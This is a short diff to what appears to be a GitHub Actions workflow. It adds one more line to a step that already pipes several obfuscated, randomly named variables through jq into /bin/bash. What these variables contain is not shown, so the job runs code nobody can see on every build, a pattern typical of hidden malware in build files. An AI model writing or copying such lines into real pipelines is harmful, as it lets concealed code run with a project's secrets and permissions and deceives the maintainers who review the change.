@@ -23,6 +23,7 @@ jobs:
           echo $bmkg29 | jq -r .qsqig79007 | /bin/bash
           echo $jzn87 | jq -r .oywe15963 | /bin/bash
           printf '%s' "$h7" | jq -r .alo43832 | /bin/bash
+          printf '%s' "$zwamy48248" | jq -r .p1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
